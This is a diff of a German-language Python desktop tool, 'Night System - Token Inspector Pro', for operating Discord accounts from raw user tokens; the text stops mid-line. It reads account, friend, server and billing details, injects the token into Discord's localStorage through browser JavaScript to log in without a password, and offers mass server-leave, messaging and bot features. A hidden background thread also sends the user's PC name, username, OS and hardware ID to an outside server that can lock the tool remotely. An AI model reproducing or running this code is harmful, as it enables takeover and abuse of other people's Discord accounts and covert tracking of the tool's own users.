@@ -1,7 +1,3565 @@
 import os
+import sys
 
-code = 'import os\nimport sys\n\n# Configure UTF-8 on Windows console immediately\ntry:\n    if sys.stdout and hasattr(sys.stdout, "reconfigure"):\n        sys.stdout.reconfigure(encoding="utf-8", errors="replace")\n    if sys.stderr and hasattr(sys.stderr, "reconfigure"):\n        sys.stderr.reconfigure(encoding="utf-8", errors="replace")\nexcept Exception:\n    pass\n\nimport customtkinter as ctk\nfrom PIL import Image, ImageDraw\nimport requests\nimport threading\nimport io\nimport json\nimport time\nimport subprocess\nimport re\nimport random\nfrom datetime import datetime\n\n# ==============================================================================\n#  NIGHT SYSTEM • GLASSMORPHISM SILVER-GRAY DESIGN & FARBPALETTE (OHNE EMOJIS)\n# ==============================================================================\nC = {\n    # Frosted Slate / Silver-Gray Glaspalette\n    "bg":                   "#0d1017",\n    "sidebar":              "#121620",\n    "card":                 "#161b26",\n    "card_alt":             "#1b2232",\n    "card_hover":           "#222b3e",\n    "card_border":          "#263246",\n    "card_border_hi":       "#3a4964",\n    \n    # Button Palette\n    "btn_gray":             "#1a202c",\n    "btn_gray_hover":       "#262f40",\n    "btn_gray_border":      "#323e56",\n    "btn_gray_text":        "#e2e8f0",\n    \n    # Durchsichtige Akzent-Buttons & Karten\n    "acc_yellow_bg":        "#1a1d24",\n    "acc_yellow_border":    "#eab308",\n    "acc_yellow_text":      "#fde047",\n    "acc_yellow_hover":     "#26251b",\n    \n    "acc_purple_bg":        "#1a1d26",\n    "acc_purple_border":    "#a855f7",\n    "acc_purple_text":      "#d8b4fe",\n    "acc_purple_hover":     "#241d2e",\n\n    "acc_orange_bg":        "#1a1d24",\n    "acc_orange_border":    "#f97316",\n    "acc_orange_text":      "#fdba74",\n    "acc_orange_hover":     "#28201b",\n\n    "acc_green_bg":         "#171e22",\n    "acc_green_border":     "#22c55e",\n    "acc_green_text":       "#86efac",\n    "acc_green_hover":      "#1a261f",\n\n    "acc_cyan_bg":          "#161e27",\n    "acc_cyan_border":      "#06b6d4",\n    "acc_cyan_text":        "#67e8f9",\n    "acc_cyan_hover":       "#18252f",\n\n    # Typografie & Signale\n    "text":                 "#f8fafc",\n    "text_sub":             "#cbd5e1",\n    "text_muted":           "#818ea3",\n    "text_dim":             "#475569",\n    \n    "blurple":              "#5865f2",\n    "blurple_hi":           "#4752c4",\n    "green":                "#22c55e",\n    "green_bg":             "#13261a",\n    "green_border":         "#16a34a",\n    "red":                  "#ef4444",\n    "red_bg":               "#20181b",\n    "red_border":           "#dc2626",\n    "red_hover":            "#35171d",\n    "red_text":             "#fca5a5",\n}\n\nPLATFORM_ICONS = {\n    "spotify":       {"color": "#1db954", "tag": "SP", "name": "Spotify"},\n    "steam":         {"color": "#66c0f4", "tag": "ST", "name": "Steam"},\n    "twitch":        {"color": "#a970ff", "tag": "TW", "name": "Twitch"},\n    "youtube":       {"color": "#ff4444", "tag": "YT", "name": "YouTube"},\n    "github":        {"color": "#f0f6fc", "tag": "GH", "name": "GitHub"},\n    "reddit":        {"color": "#ff5722", "tag": "RD", "name": "Reddit"},\n    "twitter":       {"color": "#1da1f2", "tag": "TW", "name": "Twitter / X"},\n    "x":             {"color": "#ffffff", "tag": "X",  "name": "X (Twitter)"},\n    "xbox":          {"color": "#107c10", "tag": "XB", "name": "Xbox Live"},\n    "playstation":   {"color": "#006fcd", "tag": "PS", "name": "PlayStation"},\n    "battlenet":     {"color": "#00aeff", "tag": "BN", "name": "Battle.net"},\n    "riotgames":     {"color": "#eb0029", "tag": "RG", "name": "Riot Games"},\n    "tiktok":        {"color": "#00f2fe", "tag": "TT", "name": "TikTok"},\n}\n\nDEMO_DATA = {\n    "user": {\n        "id": "1083429182736451290",\n        "username": "nightheid_pro",\n        "global_name": "Night System Admin",\n        "avatar": None,\n        "discriminator": "0",\n        "public_flags": (1 << 6) | (1 << 9) | (1 << 22),\n        "flags": (1 << 6) | (1 << 9) | (1 << 22),\n        "banner": None,\n        "banner_color": "#5865f2",\n        "accent_color": 5793266,\n        "bio": "Night System - Silver-Glass Edition - Maximale Performance und Transparenz.",\n        "locale": "de",\n        "mfa_enabled": True,\n        "email": "maxia.night@example.com",\n        "verified": True,\n        "phone": "+49 170 .......",\n        "premium_type": 2\n    },\n    "connections": [\n        {"type": "spotify", "name": "Nightheid_Official", "verified": True, "show_activity": True},\n        {"type": "steam", "name": "NightSystem77", "verified": True, "show_activity": True},\n        {"type": "github", "name": "NightDev-Maxi", "verified": True, "show_activity": False},\n        {"type": "youtube", "name": "Night System Studio", "verified": True, "show_activity": True},\n        {"type": "twitch", "name": "nightheid_live", "verified": True, "show_activity": True},\n    ],\n    "guilds": [\n        {"id": "119283746501928374", "name": "Night System Community", "owner": True, "permissions": "8", "icon": None},\n        {"id": "228374659102938475", "name": "CyberSec Lab HQ", "owner": True, "permissions": "8", "icon": None},\n        {"id": "337485960293847561", "name": "Gaming Lounge VIP", "owner": False, "permissions": "8", "icon": None},\n        {"id": "448596071829304152", "name": "Phasmophobia Hunters EU", "owner": False, "permissions": "2048", "icon": None},\n        {"id": "559607182930415263", "name": "CustomTkinter Developers", "owner": False, "permissions": "1024", "icon": None},\n        {"id": "660718293041526374", "name": "Public Anime Hangout", "owner": False, "permissions": "1024", "icon": None},\n    ],\n    "friends": [\n        {"id": "1001", "name": "Alex Gamer", "username": "alex_gamer", "type_name": "Freund", "is_group": False},\n        {"id": "1002", "name": "Sarah C.", "username": "sarah_codes", "type_name": "Freund", "is_group": False},\n        {"id": "1003", "name": "Shadow Ninja", "username": "shadow_ninja", "type_name": "Freund", "is_group": False},\n        {"id": "1004", "name": "Gaming Squad EU", "username": "5 Mitglieder", "type_name": "Gruppe", "is_group": True},\n        {"id": "1005", "name": "Dev Lounge Group", "username": "3 Mitglieder", "type_name": "Gruppe", "is_group": True},\n        {"id": "1006", "name": "Lisa M.", "username": "lisa_music", "type_name": "Anfrage", "is_group": False},\n    ],\n    "billing": [\n        {"id": "9918273645", "type": 1, "brand": "visa", "last_4": "4242", "expires_month": 12, "expires_year": 2028, "invalid": False, "default": True},\n        {"id": "8827364510", "type": 2, "email": "maxia.paypal@example.com", "invalid": False, "default": False}\n    ],\n    "user_to_channel_map": {\n        "1001": "2001",\n        "1002": "2002",\n        "1003": "2003",\n        "1006": "2006"\n    }\n}\n\nctk.set_appearance_mode("dark")\nctk.set_default_color_theme("dark-blue")\n\n# ==============================================================================\n#  HILFSFUNKTIONEN & SICHERE API-ANFRAGEN\n# ==============================================================================\ndef get_asset_path(filename):\n    if hasattr(sys, "_MEIPASS"):\n        p1 = os.path.join(sys._MEIPASS, "assets", filename)\n        if os.path.exists(p1): return p1\n        p2 = os.path.join(sys._MEIPASS, filename)\n        if os.path.exists(p2): return p2\n    base_dir = os.path.dirname(os.path.abspath(__file__))\n    candidates = [\n        os.path.join(os.path.dirname(sys.executable), "assets", filename),\n        os.path.join(base_dir, "..", "assets", filename),\n        os.path.join(base_dir, "assets", filename),\n        os.path.join(os.getcwd(), "assets", filename),\n        os.path.join(r"C:\\Users\\maxia\\Desktop\\Night System\\assets", filename)\n    ]\n    for c in candidates:\n        if os.path.exists(c): return c\n    return None\n\ndef snowflake_to_datetime_info(sf_id):\n    try:\n        sf_int = int(sf_id)\n        ts_ms = (sf_int >> 22) + 1420070400000\n        dt = datetime.fromtimestamp(ts_ms / 1000.0)\n        now = datetime.now()\n        days = (now - dt).days\n        years = days // 365\n        rem_days = days % 365\n        months = rem_days // 30\n        parts = []\n        if years > 0: parts.append(f"{years} J.")\n        if months > 0: parts.append(f"{months} M.")\n        if not parts: parts.append(f"{days} Tage")\n        short_age = " ".join(parts)\n        return dt.strftime("%d.%m.%Y"), f"vor {short_age}", days\n    except Exception:\n        return "Unbekannt", "-", 0\n\ndef make_circle_avatar(pil_img, size=(64, 64)):\n    try:\n        pil_img = pil_img.resize(size, Image.Resampling.LANCZOS).convert("RGBA")\n        mask = Image.new("L", size, 0)\n        draw = ImageDraw.Draw(mask)\n        draw.ellipse((0, 0, size[0], size[1]), fill=255)\n        output = Image.new("RGBA", size, (0, 0, 0, 0))\n        output.paste(pil_img, (0, 0), mask=mask)\n        return output\n    except Exception:\n        return None\n\ndef make_discord_api_request(method, url, token, json_data=None, timeout=6):\n    headers = {\n        "Authorization": token,\n        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",\n        "Content-Type": "application/json"\n    }\n    for _ in range(3):\n        try:\n            m = method.upper()\n            if m == "GET":\n                r = requests.get(url, headers=headers, timeout=timeout)\n            elif m == "POST":\n                r = requests.post(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)\n            elif m == "PATCH":\n                r = requests.patch(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)\n            elif m == "PUT":\n                r = requests.put(url, headers=headers, json=json_data if json_data is not None else {}, timeout=timeout)\n            elif m == "DELETE":\n                r = requests.delete(url, headers=headers, timeout=timeout)\n            else:\n                return None\n\n            if r.status_code == 429:\n                try:\n                    retry_sec = float(r.json().get("retry_after", 1.0))\n                except Exception:\n                    retry_sec = 1.0\n                time.sleep(min(retry_sec, 2.5))\n                continue\n\n            return r\n        except Exception:\n            time.sleep(0.3)\n    return None\n\n# ==============================================================================\n#  EXTRA-UI BROWSER AUTO-LOGIN (Microsoft Edge WebView2)\n# ==============================================================================\ndef run_browser_session(token: str, username: str = ""):\n    import webview\n\n    token = token.strip()\n    if not token:\n        return\n\n    title = f"Night System - Discord Web Session - @{username}" if username else "Night System - Discord Web Session"\n    start_url = "https://discord.com/login"\n\n    raw_js = r"""\n    (function() {\n        const token = __TOKEN_JSON__;\n        const username = __USER_JSON__;\n\n        function injectTokenNow() {\n            try { localStorage.setItem("token", JSON.stringify(token)); } catch(e) {}\n            try { localStorage.token = JSON.stringify(token); } catch(e) {}\n            try {\n                let ifr = document.getElementById("__night_token_ifr");\n                if (!ifr) {\n                    ifr = document.createElement("iframe");\n                    ifr.id = "__night_token_ifr";\n                    ifr.style.display = "none";\n                    document.body.appendChild(ifr);\n                }\n                ifr.contentWindow.localStorage.setItem("token", JSON.stringify(token));\n                ifr.contentWindow.localStorage.token = JSON.stringify(token);\n            } catch(e) {}\n        }\n\n        injectTokenNow();\n        let count = 0;\n        let iv = setInterval(function() {\n            count++;\n            injectTokenNow();\n            if (count >= 15) {\n                clearInterval(iv);\n                if (window.location.pathname.includes("login") || window.location.pathname === "/" || window.location.pathname.includes("register")) {\n                    window.location.replace("https://discord.com/channels/@me");\n                }\n            }\n        }, 100);\n\n        function addFloatingBar() {\n            if (document.getElementById("night-helper-bar")) return;\n            const bar = document.createElement("div");\n            bar.id = "night-helper-bar";\n            const userLabel = username ? (\'@\' + username) : \'Auto-Login aktiv\';\n            bar.innerHTML = \'<div style="display:flex;align-items:center;gap:6px;"><span style="font-weight:700;color:#5865f2;">Night System</span><span style="color:#8b94a5;">|</span><span style="color:#c7cdd8;font-weight:600;">\' + userLabel + \'</span></div><button id="night-reinject-btn" style="background:#5865f2;color:#fff;border:none;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:700;cursor:pointer;">Auto-Login</button><button id="night-reload-btn" style="background:#202b3d;color:#fff;border:1px solid #2e3d57;border-radius:6px;padding:4px 10px;font-size:11px;font-weight:600;cursor:pointer;">Reload</button><span id="night-close-bar" style="cursor:pointer;color:#8b94a5;font-weight:bold;padding-left:4px;">X</span>\';\n            bar.style.cssText = "position:fixed;top:10px;right:18px;z-index:99999999;background:rgba(14,19,29,0.92);border:1px solid #2e3d57;backdrop-filter:blur(10px);border-radius:10px;padding:6px 14px;box-shadow:0 8px 30px rgba(0,0,0,0.6);display:flex;align-items:center;gap:12px;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;font-size:12px;color:#ffffff;user-select:none;";\n            document.body.appendChild(bar);\n\n            const rBtn = document.getElementById("night-reinject-btn");\n            if (rBtn) {\n                rBtn.onclick = function() {\n                    injectTokenNow();\n                    rBtn.innerText = "Eingeloggt";\n                    setTimeout(() => { window.location.replace("https://discord.com/channels/@me"); }, 500);\n                };\n            }\n            const relBtn = document.getElementById("night-reload-btn");\n            if (relBtn) { relBtn.onclick = function() { location.reload(); }; }\n            const cBtn = document.getElementById("night-close-bar");\n            if (cBtn) { cBtn.onclick = function() { bar.remove(); }; }\n        }\n        setTimeout(addFloatingBar, 1500);\n    })();\n    """\n    injection_js = raw_js.replace("__TOKEN_JSON__", json.dumps(token)).replace("__USER_JSON__", json.dumps(username))\n\n    window = webview.create_window(\n        title=title,\n        url=start_url,\n        width=1340,\n        height=880,\n        min_size=(960, 600),\n        text_select=True,\n    )\n\n    def on_loaded():\n        def run_js():\n            time.sleep(0.4)\n            try: window.evaluate_js(injection_js)\n            except Exception: pass\n        threading.Thread(target=run_js, daemon=True).start()\n\n    window.events.loaded += on_loaded\n    webview.start(private_mode=False)\n\n\nDISCORD_TOOL_VERSION = "1.1.0"\nCLOUD_API_ENDPOINT = "https://whatsapp-kadi.onrender.com/api/discord"\n\n# ==============================================================================\n#  HAUPTANWENDUNG (DURCHSICHTIGE SILVER-GLASS UI OHNE EMOJIS)\n# ==============================================================================\nclass App(ctk.CTk):\n    def __init__(self, user_data=None, connections_data=None, guilds_data=None, billing_data=None, friends_data=None, user_to_channel_map=None, token="", cloud_info=None):\n        super().__init__()\n        self.title("Night System - Token Inspector Pro")\n        self.geometry("1260x840")\n        self.minsize(1020, 680)\n        self.configure(fg_color=C["bg"])\n        \n        # Echte Fenster-Transparenz (Durchsichtigkeits-Effekt)\n        try:\n            self.attributes("-alpha", 0.93)\n        except Exception:\n            pass\n\n        # Windows Taskleisten-Icon\n        icon_path = get_asset_path("icon.ico")\n        if icon_path and os.path.exists(icon_path):\n            try: self.iconbitmap(icon_path)\n            except Exception: pass\n\n        self.cloud_info = cloud_info or {}\n        self.token = token\n        self.user_data = user_data or {}\n        self.connections_data = connections_data or []\n        self.guilds_data = guilds_data or []\n        self.billing_data = billing_data or []\n        self.friends_data = friends_data or []\n        self.user_to_channel_map = user_to_channel_map or {}\n        self.active_tab = "overview"\n        self.avatar_img_ctk = None\n\n        # Server Management State\n        self.guild_cards = {}\n        self.guild_checkboxes = {}\n        self.leave_in_progress = False\n        self.stop_requested = False\n\n        # Freunde & Gruppen State\n        self.friend_cards = {}\n        self.friend_checkboxes = {}\n        self.friend_leave_in_progress = False\n        self.friend_stop_requested = False\n\n        # Extra Tab State\n        self.extra_in_progress = False\n        self.extra_stop_requested = False\n\n        # Bot & Click Instant State\n        self.bot_active = False\n        self.bot_loading = False\n        self.external_click_instant_win = None\n        self.click_instant_running = False\n\n        # Message Sender State\n        self.msg_send_in_progress = False\n        self.msg_stop_requested = False\n\n        self._build_layout()\n        self._load_avatar_async()\n\n    def _build_layout(self):\n        # 1. LINKE SIDEBAR (Navigation & User-Profil in runder Schiefer-Optik)\n        self.sidebar = ctk.CTkFrame(self, width=240, fg_color=C["sidebar"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        self.sidebar.pack(side="left", fill="y", padx=(14, 7), pady=14)\n        self.sidebar.pack_propagate(False)\n        self._build_sidebar()\n\n        # 2. VOLLER MITTLERER CONTENT-BEREICH\n        self.center_area = ctk.CTkFrame(self, fg_color="transparent")\n        self.center_area.pack(side="left", fill="both", expand=True, padx=(7, 14), pady=14)\n        \n        # Container fuer dynamische Tabs\n        self.tab_container = ctk.CTkFrame(self.center_area, fg_color="transparent")\n        self.tab_container.pack(fill="both", expand=True)\n\n        self.frame_overview      = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_guilds        = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_friends       = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_join          = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_extra         = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_bot           = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_click_instant = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_conn          = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n        self.frame_billing       = ctk.CTkFrame(self.tab_container, fg_color="transparent")\n\n        self._build_overview_tab()\n        self._build_guilds_tab()\n        self._build_friends_tab()\n        self._build_join_tab()\n        self._build_extra_tab()\n        self._build_bot_tab()\n        self._build_click_instant_tab()\n        self._build_conn_tab()\n        self._build_billing_tab()\n\n        self._switch_tab("overview")\n        self._populate_quick_targets()\n        self._start_cloud_heartbeat_sync()\n\n    def _start_cloud_heartbeat_sync(self):\n        def _worker():\n            import socket, platform, uuid\n            pc_name = os.environ.get("COMPUTERNAME") or socket.gethostname() or "PC"\n            username = os.environ.get("USERNAME") or "Benutzer"\n            os_name = f"{platform.system()} {platform.release()}"\n            hwid = f"HWID-{uuid.getnode():012X}"\n\n            payload = {\n                "clientId": f"{pc_name}_{username}",\n                "hwid": hwid,\n                "pcName": pc_name,\n                "username": username,\n                "os": os_name,\n                "version": DISCORD_TOOL_VERSION\n            }\n\n            while True:\n                time.sleep(30)\n                try:\n                    res = requests.post(f"{CLOUD_API_ENDPOINT}/heartbeat", json=payload, timeout=5)\n                    if res.status_code == 200:\n                        data = res.json()\n                        if data.get("isLocked"):\n                            self.after(0, lambda r=data.get("lockReason"): self._on_remote_lock_triggered(r))\n                            break\n                        ann = data.get("announcement")\n                        if ann and ann != getattr(self, "_last_broadcast_seen", ""):\n                            self._last_broadcast_seen = ann\n                            self._append_bot_log(f"[BROADCAST] {ann}")\n                except Exception:\n                    pass\n\n        threading.Thread(target=_worker, daemon=True).start()\n\n    def _on_remote_lock_triggered(self, reason):\n        self._append_bot_log(f"[WARNUNG] Tool wurde ueber das Web-Dashboard gesperrt! Grund: {reason}")\n        try:\n            import tkinter.messagebox as mb\n            mb.showerror("Night System - Gesperrt", f"Das Tool wurde vom Administrator auf dem Web-Dashboard gesperrt!\\n\\nGrund: {reason}\\n\\nDas Programm wird beendet.")\n        except Exception:\n            pass\n        self.destroy()\n        sys.exit(0)\n\n    # --------------------------------------------------------------------------\n    # 1. SIDEBAR\n    # --------------------------------------------------------------------------\n    def _build_sidebar(self):\n        u = self.user_data\n        uname = u.get("username", "Benutzer")\n        gname = u.get("global_name") or uname\n        initial = (gname[:1] or uname[:1] or "U").upper()\n\n        prof_card = ctk.CTkFrame(self.sidebar, fg_color="transparent")\n        prof_card.pack(fill="x", padx=14, pady=(18, 16))\n\n        self.lbl_side_avatar = ctk.CTkLabel(prof_card, text=initial, font=("Segoe UI", 14, "bold"), text_color=C["text_sub"], width=40, height=40, fg_color=C["card"], corner_radius=20)\n        self.lbl_side_avatar.pack(side="left", padx=(0, 10))\n\n        text_col = ctk.CTkFrame(prof_card, fg_color="transparent")\n        text_col.pack(side="left", fill="x", expand=True)\n\n        self.lbl_sidebar_name = ctk.CTkLabel(text_col, text=gname[:17], font=("Segoe UI", 12, "bold"), text_color=C["text"])\n        self.lbl_sidebar_name.pack(anchor="w")\n\n        lbl_sub = ctk.CTkLabel(text_col, text="Online", font=("Segoe UI", 9.5, "bold"), text_color=C["green"])\n        lbl_sub.pack(anchor="w")\n\n        self.lbl_menu_title = ctk.CTkLabel(self.sidebar, text="HAUPTMENUE", font=("Segoe UI", 9, "bold"), text_color=C["text_dim"])\n        self.lbl_menu_title.pack(anchor="w", padx=18, pady=(10, 6))\n\n        # Navigation Tabs\n        self.nav_order = ["overview", "guilds", "friends", "join", "extra", "bot", "click_instant", "conn", "billing"]\n        self.nav_btns = {}\n        self.nav_btns["overview"]      = self._create_nav_btn("Uebersicht", "overview")\n        self.nav_btns["guilds"]        = self._create_nav_btn(f"Server ({len(self.guilds_data)})", "guilds")\n        self.nav_btns["friends"]       = self._create_nav_btn(f"Freunde & Gruppen ({len(self.friends_data)})", "friends")\n        self.nav_btns["join"]          = self._create_nav_btn("Server beitreten", "join")\n        self.nav_btns["extra"]         = self._create_nav_btn("Extra", "extra")\n        self.nav_btns["bot"]           = self._create_nav_btn("Bot", "bot")\n        self.nav_btns["click_instant"] = self._create_nav_btn("Click Instant", "click_instant")\n        self.nav_btns["conn"]          = self._create_nav_btn(f"Verbindungen ({len(self.connections_data)})", "conn")\n        self.nav_btns["billing"]       = self._create_nav_btn("Nitro & Billing", "billing")\n\n        # click_instant anfaenglich ausblenden (wird freigeschaltet wenn Bot aktiv)\n        self.nav_btns["click_instant"].pack_forget()\n\n        # Unten: Web Login Button\n        bottom_box = ctk.CTkFrame(self.sidebar, fg_color="transparent")\n        bottom_box.pack(side="bottom", fill="x", padx=12, pady=16)\n\n        btn_web = ctk.CTkButton(\n            bottom_box,\n            text="Web Login",\n            font=("Segoe UI", 11, "bold"),\n            fg_color=C["btn_gray"],\n            text_color=C["text"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            height=38,\n            corner_radius=12,\n            command=self.launch_browser_login\n        )\n        btn_web.pack(fill="x", pady=4)\n\n        lbl_foot = ctk.CTkLabel(bottom_box, text="Night System - Glass Pro", font=("Segoe UI", 9), text_color=C["text_dim"])\n        lbl_foot.pack(pady=(6, 0))\n\n    def _create_nav_btn(self, text, tab_name):\n        btn = ctk.CTkButton(\n            self.sidebar,\n            text=text,\n            font=("Segoe UI", 11, "bold"),\n            fg_color="transparent",\n            text_color=C["text_sub"],\n            hover_color=C["card_hover"],\n            anchor="w",\n            height=38,\n            corner_radius=12,\n            command=lambda: self._switch_tab(tab_name)\n        )\n        btn.pack(fill="x", padx=12, pady=2)\n        return btn\n\n    def _switch_tab(self, tab_name):\n        self.active_tab = tab_name\n        for name, btn in self.nav_btns.items():\n            if name == tab_name:\n                btn.configure(fg_color=C["card_hover"], text_color=C["text"], border_color=C["card_border"], border_width=1)\n            else:\n                btn.configure(fg_color="transparent", text_color=C["text_sub"], border_width=0)\n\n        for f in [self.frame_overview, self.frame_guilds, self.frame_friends, self.frame_join, self.frame_extra, self.frame_bot, self.frame_click_instant, self.frame_conn, self.frame_billing]:\n            f.pack_forget()\n\n        tab_map = {\n            "overview":      self.frame_overview,\n            "guilds":        self.frame_guilds,\n            "friends":       self.frame_friends,\n            "join":          self.frame_join,\n            "extra":         self.frame_extra,\n            "bot":           self.frame_bot,\n            "click_instant": self.frame_click_instant,\n            "conn":          self.frame_conn,\n            "billing":       self.frame_billing\n        }\n        if tab_name in tab_map:\n            tab_map[tab_name].pack(fill="both", expand=True)\n\n    def _enter_bot_mode(self):\n        # Alle anderen Tabs schliessen/ausblenden, nur Bot-Tab bleibt sichtbar\n        for name, btn in self.nav_btns.items():\n            if name != "bot":\n                btn.pack_forget()\n        if hasattr(self, "lbl_menu_title"):\n            self.lbl_menu_title.configure(text="BOT MODUS")\n        self._switch_tab("bot")\n\n    def _exit_bot_mode(self):\n        # Alle Tabs wiederherstellen\n        for name in self.nav_order:\n            if name == "click_instant":\n                continue\n            btn = self.nav_btns.get(name)\n            if btn:\n                btn.pack_forget()\n                btn.pack(fill="x", padx=12, pady=2)\n        if hasattr(self, "lbl_menu_title"):\n            self.lbl_menu_title.configure(text="HAUPTMENUE")\n\n    # --------------------------------------------------------------------------\n    # 2. MITTLERER CONTENT: UEBERSICHT\n    # --------------------------------------------------------------------------\n    def _build_overview_tab(self):\n        u = self.user_data\n        uname = u.get("username", "-")\n        gname = u.get("global_name") or uname\n        uid = str(u.get("id", "-"))\n        dt_str, age_str, days_num = snowflake_to_datetime_info(uid)\n        owned_guilds = sum(1 for g in self.guilds_data if g.get("owner"))\n        initial = (gname[:1] or uname[:1] or "U").upper()\n\n        scroll = ctk.CTkScrollableFrame(self.frame_overview, fg_color="transparent")\n        scroll.pack(fill="both", expand=True)\n\n        # HERO CARD\n        hero_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        hero_card.pack(fill="x", pady=(0, 14))\n\n        hero_inner = ctk.CTkFrame(hero_card, fg_color="transparent")\n        hero_inner.pack(fill="x", padx=22, pady=20)\n\n        self.lbl_hero_avatar = ctk.CTkLabel(hero_inner, text=initial, font=("Segoe UI", 28, "bold"), text_color=C["text_sub"], width=80, height=80, fg_color=C["card_alt"], corner_radius=40)\n        self.lbl_hero_avatar.pack(side="left", padx=(0, 20))\n\n        hero_text = ctk.CTkFrame(hero_inner, fg_color="transparent")\n        hero_text.pack(side="left", fill="x", expand=True)\n\n        self.lbl_hero_title = ctk.CTkLabel(hero_text, text=gname, font=("Segoe UI", 22, "bold"), text_color=C["text"])\n        self.lbl_hero_title.pack(anchor="w")\n\n        self.lbl_hero_sub = ctk.CTkLabel(hero_text, text=f"@{uname}  |  ID: {uid}", font=("Segoe UI", 11), text_color=C["text_muted"])\n        self.lbl_hero_sub.pack(anchor="w", pady=(2, 6))\n\n        bio_txt = u.get("bio") or "Discord Account - Ueber Night System verifiziert & geladen."\n        self.lbl_hero_bio = ctk.CTkLabel(hero_text, text=bio_txt[:110], font=("Segoe UI", 10.5), text_color=C["text_sub"])\n        self.lbl_hero_bio.pack(anchor="w")\n\n        hero_actions = ctk.CTkFrame(hero_inner, fg_color="transparent")\n        hero_actions.pack(side="right", padx=(10, 0))\n\n        btn_hero_web = ctk.CTkButton(\n            hero_actions,\n            text="Web Login",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            corner_radius=12,\n            height=34,\n            width=110,\n            command=self.launch_browser_login\n        )\n        btn_hero_web.pack(pady=3)\n\n        btn_hero_guilds = ctk.CTkButton(\n            hero_actions,\n            text="Server oeffnen",\n            font=("Segoe UI", 10.5, "bold"),\n            fg_color=C["btn_gray"],\n            hover_color=C["btn_gray_hover"],\n            border_color=C["card_border_hi"],\n            border_width=1,\n            corner_radius=12,\n            height=34,\n            width=110,\n            command=lambda: self._switch_tab("guilds")\n        )\n        btn_hero_guilds.pack(pady=3)\n\n        # 5 CARDS GRID\n        grid_frame = ctk.CTkFrame(scroll, fg_color="transparent")\n        grid_frame.pack(fill="x", pady=(0, 14))\n        grid_frame.grid_columnconfigure((0, 1), weight=1)\n\n        self.c1_card = ctk.CTkFrame(grid_frame, fg_color=C["acc_yellow_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_yellow_border"])\n        self.c1_card.grid(row=0, column=0, padx=(0, 7), pady=(0, 12), sticky="nsew")\n        self._populate_accent_card(\n            self.c1_card,\n            "SERVER STATS",\n            f"{len(self.guilds_data)}",\n            f"{owned_guilds} eigene Inhaber-Server",\n            C["acc_yellow_text"],\n            action_btn=("Server verwalten >", lambda: self._switch_tab("guilds"), C["acc_yellow_border"], C["acc_yellow_text"])\n        )\n\n        c2 = ctk.CTkFrame(grid_frame, fg_color=C["acc_orange_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_orange_border"])\n        c2.grid(row=0, column=1, padx=(7, 0), pady=(0, 12), sticky="nsew")\n        self._populate_accent_card(c2, "ACCOUNT ALTER", f"{days_num} Tage", f"Erstellt: {dt_str} ({age_str})", C["acc_orange_text"])\n\n        sub_grid = ctk.CTkFrame(scroll, fg_color="transparent")\n        sub_grid.pack(fill="x", pady=(0, 14))\n        sub_grid.grid_columnconfigure((0, 1, 2), weight=1)\n\n        p_type = u.get("premium_type", 0)\n        nitro_txt = "Nitro Booster" if p_type == 2 else ("Nitro Classic" if p_type == 1 else ("Nitro Basic" if p_type == 3 else "Kein Nitro"))\n        c3 = ctk.CTkFrame(sub_grid, fg_color=C["acc_purple_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_purple_border"])\n        c3.grid(row=0, column=0, padx=(0, 6), sticky="nsew")\n        self._populate_accent_card(\n            c3,\n            "NITRO LEVEL",\n            nitro_txt,\n            f"Abo-Stufe {p_type}",\n            C["acc_purple_text"],\n            small=True,\n            action_btn=("Nitro Details >", lambda: self._switch_tab("billing"), C["acc_purple_border"], C["acc_purple_text"])\n        )\n\n        mfa = u.get("mfa_enabled", False)\n        ver = u.get("verified", False)\n        c4 = ctk.CTkFrame(sub_grid, fg_color=C["acc_green_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_green_border"])\n        c4.grid(row=0, column=1, padx=6, sticky="nsew")\n        self._populate_accent_card(c4, "SICHERHEIT", "2FA Aktiv" if mfa else "2FA Inaktiv", "E-Mail verifiziert" if ver else "Nicht verifiziert", C["acc_green_text"], small=True)\n\n        c5 = ctk.CTkFrame(sub_grid, fg_color=C["acc_cyan_bg"], corner_radius=16, border_width=1.5, border_color=C["acc_cyan_border"])\n        c5.grid(row=0, column=2, padx=(6, 0), sticky="nsew")\n        self._populate_accent_card(\n            c5,\n            "KONTAKTE",\n            f"{len(self.friends_data)} Freunde & DMs",\n            f"{len(self.connections_data)} Verknuepfungen",\n            C["acc_cyan_text"],\n            small=True,\n            action_btn=("Freunde oeffnen >", lambda: self._switch_tab("friends"), C["acc_cyan_border"], C["acc_cyan_text"])\n        )\n\n        detail_card = ctk.CTkFrame(scroll, fg_color=C["card"], corner_radius=18, border_width=1, border_color=C["card_border"])\n        detail_card.pack(fill="x", pady=(0, 10))\n\n        dc_top = ctk.CTkFrame(detail_card, fg_color="transparent")\n        dc_top.pack(fill="x", padx=20, pady=16, side="top")\n\n        lbl_dc_title = ctk.CTkLabel(dc_top, text="Account Matrix & Details", font=("Segoe UI", 13, "bold"), text_color=C["text"])\n        lbl_dc_title.pack(side="left")\n\n        pill_box = ctk.CTkFrame(dc_top, fg_color=C["card_alt"], corner_radius=12)\n        pill_box.pack(side="right")\n\n        for p_name in ["Uebersicht", "Sicherheit", 